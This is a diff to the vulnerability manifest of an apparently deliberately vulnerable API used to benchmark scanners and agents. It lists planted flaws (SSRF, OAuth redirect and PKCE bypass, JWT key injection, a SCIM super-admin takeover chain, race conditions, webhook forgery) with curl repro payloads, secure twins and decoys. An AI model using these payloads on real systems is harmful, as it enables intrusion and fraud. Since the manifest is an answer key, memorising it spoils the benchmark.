+        curl -s -X POST http://localhost:8081/api/billing/orders/quick \
+          -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+          -d '{"kind":"credit_pack","pack":"small","couponCode":"SAVE20"}'
+      done   # -> all 20 get the discount.
+
+  - id: API-BIZ-COUPON-001-SAFE
+    title: Product create consumes a coupon use atomically (secure twin)
+    class: BusinessLogicAbuse
+    cwe: CWE-837
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/orders"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-BIZ-SEATS-001
+    title: Bulk invite bypasses the plan seat limit (BLA7 resource-quota violation)
+    class: BusinessLogicAbuse
+    cwe: CWE-770
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/org/invitations/bulk"
+    severity: Medium
+    auth: admin
+    detector: diver_business_logic
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-BIZ-SEATS-001-SAFE
+    intentional: true
+    repro: |
+      # The single-invite path enforces the seat limit; this bulk path does not.
+      # An org already at its seat cap can still invite many more:
+      curl -X POST http://localhost:8081/api/org/invitations/bulk \
+        -H "Authorization: Bearer <admin_token>" -H "Content-Type: application/json" \
+        -d '{"emails":["a@x.test","b@x.test","c@x.test","d@x.test","e@x.test"]}'
+      # -> all created despite exceeding the plan's seat limit.
+
+  - id: API-BIZ-SEATS-001-SAFE
+    title: Bulk invite with batch seat enforcement (secure twin)
+    class: BusinessLogicAbuse
+    cwe: CWE-770
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/org/invitations/bulk"
+    severity: Info
+    auth: admin
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-BIZ-DBLREFUND-001
+    title: Concurrent refunds double-grant store credit (BLA2 concurrent-workflow / TOCTOU)
+    class: RaceCondition
+    cwe: CWE-362
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/orders/{id}/refund-credit"
+    severity: High
+    auth: user
+    detector: diver_race
+    gating: VF_HARDENED
+    deterministic: false
+    secured_twin: API-BIZ-DBLREFUND-001-SAFE
+    intentional: true
+    repro: |
+      # Pay an order, then fire many concurrent refund-credit calls - the status
+      # check and the credit grant are not atomic, so credit is granted repeatedly.
+      seq 15 | xargs -P15 -I{} curl -s -X POST \
+        http://localhost:8081/api/billing/orders/<ord_id>/refund-credit \
+        -H "Authorization: Bearer <token>"
+      # -> store credit granted more than once for a single refund.
+
+  - id: API-BIZ-DBLREFUND-001-SAFE
+    title: Refund-credit with an atomic status transition (secure twin)
+    class: RaceCondition
+    cwe: CWE-362
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/orders/{id}/refund-credit"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-OAUTH-SSRF-001
+    title: Second-order SSRF via OAuth Dynamic Client Registration logo_uri fetch
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/register"
+    severity: Critical
+    auth: none
+    detector: diver_ssrf
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-OAUTH-SSRF-001-SAFE
+    intentional: true
+    repro: |
+      # Register an OAuth client whose logo_uri points at the internal metadata
+      # sink; the server fetches it and returns the (fake) credentials.
+      curl -X POST http://localhost:8081/api/oauth/register \
+        -H "Content-Type: application/json" \
+        -d '{"clientName":"x","redirectUris":["https://x/cb"],"logoUri":"http://localhost:8081/internal/cloud-metadata"}'
+      # -> logoFetch.body contains AKIAFAKE_VULNFORGE_SSRF.
+
+  - id: AUTH-OAUTH-SSRF-001-SAFE
+    title: DCR with logo_uri scheme + private-host validation (secure twin)
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/register"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-OAUTH-REDIR-001
+    title: Loose redirect_uri prefix-matching enables auth-code theft
+    class: OpenRedirect
+    cwe: CWE-601
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/authorize"
+    severity: High
+    auth: user
+    detector: diver_oauth_redirect
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-OAUTH-REDIR-001-SAFE
+    intentional: true
+    repro: |
+      # Substring match accepts a redirect whose real host is attacker-controlled:
+      curl -X POST http://localhost:8081/api/oauth/authorize-loose \
+        -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+        -d '{"clientId":"demo-integration","redirectUri":"https://evil.example/cb?next=https://demo.example/callback"}'
+      # -> 200 + code issued; the code is delivered to evil.example.
+
+  - id: AUTH-OAUTH-REDIR-001-SAFE
+    title: Authorize with exact redirect_uri allowlist match (secure twin)
+    class: OpenRedirect
+    cwe: CWE-601
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/authorize"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-OAUTH-PKCE-001
+    title: Token endpoint skips PKCE verification (downgrade)
+    class: BrokenAuthentication
+    cwe: CWE-287
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/token"
+    severity: High
+    auth: none
+    detector: diver_oauth_pkce
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-OAUTH-PKCE-001-SAFE
+    intentional: true
+    repro: |
+      # A code issued WITH an S256 challenge is redeemed with NO verifier:
+      curl -X POST http://localhost:8081/api/oauth/token-v1 \
+        -H "Content-Type: application/json" \
+        -d '{"code":"<code>","clientId":"demo-integration","redirectUri":"https://demo.example/callback"}'
+      # -> 200 + access_token, despite no PKCE verifier.
+
+  - id: AUTH-OAUTH-PKCE-001-SAFE
+    title: Token endpoint verifies the PKCE code_verifier (secure twin)
+    class: BrokenAuthentication
+    cwe: CWE-287
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/token"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-OAUTH-JWK-001
+    title: id_token verified with an attacker-embedded jwk header (JWKS key injection)
+    class: JWTSignatureBypass
+    cwe: CWE-347
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/verify-id-token"
+    severity: Critical
+    auth: none
+    detector: diver_jwks_kid
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-OAUTH-JWK-001-SAFE
+    intentional: true
+    repro: |
+      # Forge an id_token for the super-admin (sub=5) signed with your OWN RSA key,
+      # and embed your public key in the token's "jwk" header. The endpoint trusts
+      # the embedded key and verifies the forgery:
+      #   header = {"alg":"RS256","jwk":<your public jwk>}
+      #   payload = {"sub":"5","iss":"vulnforge-api","aud":"demo-integration"}
+      curl -X POST http://localhost:8081/api/oauth/verify-id-token \
+        -H "Content-Type: application/json" -d '{"idToken":"<forged>"}'
+      # -> {"verified":true,"claims":{"sub":"5",...}}
+
+  - id: AUTH-OAUTH-JWK-001-SAFE
+    title: id_token verified against the server JWKS key only (secure twin)
+    class: JWTSignatureBypass
+    cwe: CWE-347
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/oauth/verify-id-token"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-SCOPE-001
+    title: API-key scope confusion - a read-only PAT performs a write (prefix scope check)
+    class: BrokenFunctionAuthorization
+    cwe: CWE-863
+    owasp: "API5:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/keys/projects"
+    severity: High
+    auth: user
+    detector: diver_idor_bac
+    deterministic: true
+    gating: VF_HARDENED            # secure path = same endpoint when hardened() is true
+    secured_twin: API-SCOPE-001-SAFE
+    intentional: true
+    repro: |
+      # Mint a read-only personal access token (scope projects:read only):
+      PAT=$(curl -s -X POST http://localhost:8081/api/keys \
+        -H "Authorization: Bearer <session-jwt>" -H "Content-Type: application/json" \
+        -d '{"name":"ci","scopes":["projects:read"]}' | jq -r .token)
+      # The create endpoint checks the scope by PREFIX ("startswith projects"), so the
+      # read-only token is accepted for a write - NO -vuln route, same path as the
+      # legitimate call:
+      curl -X POST http://localhost:8081/api/keys/projects \
+        -H "Authorization: Bearer $PAT" -H "Content-Type: application/json" \
+        -d '{"name":"pwned"}'   # -> 201, project created with a read-only key.
+
+  - id: API-SCOPE-001-SAFE
+    title: Scope-gated write requires the exact projects:write scope (hardened path of same route)
+    class: BrokenFunctionAuthorization
+    cwe: CWE-863
+    owasp: "API5:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/keys/projects"   # identical route; hardened() takes the strict branch
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  # ---- CHAIN-ATO-001 link 1: discover the provisioning credential -----------
+  - id: API-SHADOW-001
+    title: Shadow integrations endpoint leaks the SCIM provisioning credential
+    class: BrokenFunctionLevelAuthorization
+    cwe: CWE-200
+    owasp: "API9:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/internal/integrations"
+    severity: High
+    auth: user
+    detector: diver_shadow_endpoint
+    gating: VF_HARDENED
+    chain: CHAIN-ATO-001
+    deterministic: true
+    secured_twin: API-SHADOW-001-SAFE
+    intentional: true
+    repro: |
+      # Undocumented (not in OpenAPI) ops endpoint, readable by ANY member. It
+      # over-exposes the org integration config - including the SCIM provisioning
+      # token and the privileged service-account user id (the chain's discovery
+      # primitive; feed both into AUTH-SCIM-001):
+      curl -s http://localhost:8081/api/internal/integrations \
+        -H "Authorization: Bearer <any member session JWT>"
+      # -> {"scim":{"token":"vfscim_demo_8c1d4e7a2b","serviceAccountUserId":5,...}}
+
+  - id: API-SHADOW-001-SAFE
+    title: Integrations config is admin-only and redacts secrets (secure twin)
+    class: BrokenFunctionLevelAuthorization
+    cwe: CWE-200
+    owasp: "API9:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/internal/integrations"
+    severity: Info
+    auth: admin
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  # ---- CHAIN-ATO-001 link 2: use the leaked credential to take over ---------
+  - id: AUTH-SCIM-001
+    title: SCIM externalId trusted as internal user id (provision-as-super-admin)
+    class: BrokenObjectPropertyLevelAuthorization
+    cwe: CWE-639
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/scim/v2/Users"
+    severity: Critical
+    auth: none
+    detector: diver_idor_bac
+    gating: VF_HARDENED
+    chain: CHAIN-ATO-001
+    prerequisite: API-SHADOW-001
+    deterministic: true
+    secured_twin: AUTH-SCIM-001-SAFE
+    intentional: true
+    repro: |
+      # The SCIM provisioning bearer is a lower-trust IdP-integration credential
+      # (config.SCIM_TOKEN), NOT an admin session. Provision a user whose
+      # externalId is the numeric id of the seeded super-admin (id 5); the server
+      # trusts it as the internal primary key, links the SCIM identity to user 5,
+      # and hands back a just-in-time access token for the super-admin:
+      curl -s -X POST http://localhost:8081/api/scim/v2/Users-vuln \
+        -H "Authorization: Bearer vfscim_demo_8c1d4e7a2b" \
+        -H "Content-Type: application/json" \
+        -d '{"userName":"evil@attacker.test","externalId":"5"}'
+      # -> {"id":"5","linked":true,"access_token":"<JWT for the super-admin>"}
+      # That token authenticates as user 5 (is_super_admin) at /api/me.
+
+  - id: AUTH-SCIM-001-SAFE
+    title: SCIM Create auto-generates the internal id; externalId is a label only (secure twin)
+    class: BrokenObjectPropertyLevelAuthorization
+    cwe: CWE-639
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/scim/v2/Users"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEBHOOK-SSRF-001
+    title: SSRF via outbound webhook test delivery (no host validation)
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/webhooks/{id}/test"
+    severity: High
+    auth: user
+    detector: diver_ssrf
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: WEBHOOK-SSRF-001-SAFE
+    intentional: true
+    repro: |
+      # Register a webhook whose URL is an internal-only address (the cloud
+      # metadata sink), then trigger a "test delivery" - the server POSTs to it
+      # with no host filtering and returns the response, leaking internal creds:
+      WID=$(curl -s -X POST http://localhost:8081/api/webhooks \
+        -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+        -d '{"url":"http://localhost:8081/internal/cloud-metadata","events":[]}' | jq .id)
+      curl -s -X POST http://localhost:8081/api/webhooks/$WID/test-vuln \
+        -H "Authorization: Bearer <token>"
+      # -> {"status":200,"responseBody":"{...AccessKeyId: AKIAFAKE_VULNFORGE_SSRF...}"}
+
+  - id: WEBHOOK-SSRF-001-SAFE
+    title: Webhook test delivery blocks internal/link-local targets (secure twin)
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/webhooks/{id}/test"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEBHOOK-SIG-001
+    title: Inbound webhook signature verification fails open on a missing header
+    class: ImproperAuthentication
+    cwe: CWE-345
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/webhooks/inbound/billing"
+    severity: High
+    auth: none
+    detector: diver_webhook_sig
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: WEBHOOK-SIG-001-SAFE
+    intentional: true
+    repro: |
+      # No shared secret needed: send an UNSIGNED billing event. The handler only
+      # verifies a signature when the header is present, so a missing header is
+      # accepted and the forged credit grant is applied:
+      curl -s -X POST http://localhost:8081/api/webhooks/inbound/billing-vuln \
+        -H "Content-Type: application/json" \
+        -d '{"id":"evt_forged_1","event":"invoice.paid","orgId":1,"credits":100000}'
+      # -> {"ok":true,"creditBalance":<inflated>}   (no X-VF-Signature sent)
+
+  - id: WEBHOOK-SIG-001-SAFE
+    title: Inbound webhook requires a valid HMAC signature (secure twin)
+    class: ImproperAuthentication
+    cwe: CWE-345
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/webhooks/inbound/billing"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEBHOOK-REPLAY-001
+    title: Inbound webhook has no idempotency/timestamp check (signed-delivery replay)
+    class: ImproperAuthentication
+    cwe: CWE-294
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/webhooks/inbound/billing"
+    severity: High
+    auth: none
+    detector: diver_webhook_sig
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: WEBHOOK-REPLAY-001-SAFE
+    intentional: true
+    repro: |
+      # Capture (or compute, given the shared secret) ONE correctly-signed
+      # delivery, then POST it repeatedly - each replay re-applies the credit
+      # grant because there is no idempotency/timestamp check:
+      SIG="sha256=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$WHSEC" -r | cut -d' ' -f1)"
+      for i in 1 2 3; do
+        curl -s -X POST http://localhost:8081/api/webhooks/inbound/billing-replay-vuln \
+          -H "X-VF-Signature: $SIG" -H "Content-Type: application/json" -d "$BODY"
+      done   # -> balance increases on every replay of the same signed delivery.
+
+  - id: WEBHOOK-REPLAY-001-SAFE
+    title: Inbound webhook enforces delivery-id idempotency (secure twin)
+    class: ImproperAuthentication
+    cwe: CWE-294
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/webhooks/inbound/billing"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WS-BOLA-001
+    title: WebSocket message lacks per-message object authz (cross-tenant task read)
+    class: BrokenObjectLevelAuthorization
+    cwe: CWE-639
+    owasp: "API1:2023"
+    tier: 1
+    origin: api
+    endpoint: "WS /api/ws/activity (fetch_task)"
+    severity: High
+    auth: user
+    detector: diver_idor_bac
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: WS-BOLA-001-SAFE
+    intentional: true
+    repro: |
+      # Connect with a valid token, then request a task that belongs to ANOTHER
+      # org over the socket - the handshake is authenticated but the message is
+      # not authorized, so any task id is returned:
+      #   ws://localhost:8081/api/ws/activity?token=<acme user JWT>
+      #   -> send {"type":"fetch_task","taskId":5}     # task 5 is Globex (org 2)
+      #   <- {"type":"task","task":{"id":5,"orgId":2,"title":"Pen test scope doc",...}}
+
+  - id: WS-BOLA-001-SAFE
+    title: WebSocket fetch_task re-checks org ownership per message (secure twin)
+    class: BrokenObjectLevelAuthorization
+    cwe: CWE-639
+    owasp: "API1:2023"
+    tier: 1
+    origin: api
+    endpoint: "WS /api/ws/activity (fetch_task)"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WS-BFLA-001
+    title: WebSocket action lacks per-message function authz (member reads audit log)
+    class: BrokenFunctionLevelAuthorization
+    cwe: CWE-862
+    owasp: "API5:2023"
+    tier: 1
+    origin: api
+    endpoint: "WS /api/ws/activity (get_audit_log)"
+    severity: High
+    auth: user
+    detector: diver_idor_bac
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: WS-BFLA-001-SAFE
+    intentional: true
+    repro: |
+      # Connect as a plain MEMBER, then invoke the admin-only audit-log action
+      # over the socket - no role is checked per message:
+      #   ws://localhost:8081/api/ws/activity?token=<charlie (member) JWT>
+      #   -> send {"type":"get_audit_log"}
+      #   <- {"type":"audit_log","entries":[...]}   # admin/owner-only data leaked
+
+  - id: WS-BFLA-001-SAFE
+    title: WebSocket get_audit_log restricted to admin/owner per message (secure twin)
+    class: BrokenFunctionLevelAuthorization
+    cwe: CWE-862
+    owasp: "API5:2023"
+    tier: 1
+    origin: api
+    endpoint: "WS /api/ws/activity (get_audit_log)"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  # ===========================================================================
+  # Phase C C4 - DECOYS. Look-vulnerable-but-correctly-secured endpoints that
+  # bait scanners/agents into wasting budget. intentional:false; each has a
+  # holds-test proving the bait attack fails. Not real vulns.
+  # ===========================================================================
+  - id: DECOY-BOLA-001
+    title: "Decoy: single comment by sequential global id (looks BOLA, org-checked)"
+    class: BOLA
+    cwe: CWE-639
+    owasp: "API1:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/comments/{comment_id}"
+    severity: Info
+    auth: user
+    deterministic: true
+    decoy: true
+    secured_twin: null
+    intentional: false
+
+  - id: DECOY-PATHTRAV-001
+    title: "Decoy: project readme ?doc= (looks path-traversal, strict whitelist)"
+    class: PathTraversal
+    cwe: CWE-22
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/projects/{project_id}/readme"
+    severity: Info
+    auth: user
+    deterministic: true
+    decoy: true
+    secured_twin: null
+    intentional: false
+
+  - id: DECOY-SSRF-001
+    title: "Decoy: avatar preview by url (looks SSRF, internal hosts blocked)"
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/avatar/preview"
+    severity: Info
+    auth: user
+    deterministic: true
+    decoy: true
+    secured_twin: null
+    intentional: false
+
+  - id: DECOY-MASSASSIGN-001
+    title: "Decoy: preferences PATCH (looks mass-assignable, allowlisted keys)"
+    class: MassAssignment
+    cwe: CWE-915
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "PATCH /api/me/preferences"
+    severity: Info
+    auth: user
+    deterministic: true
+    decoy: true
+    secured_twin: null
+    intentional: false
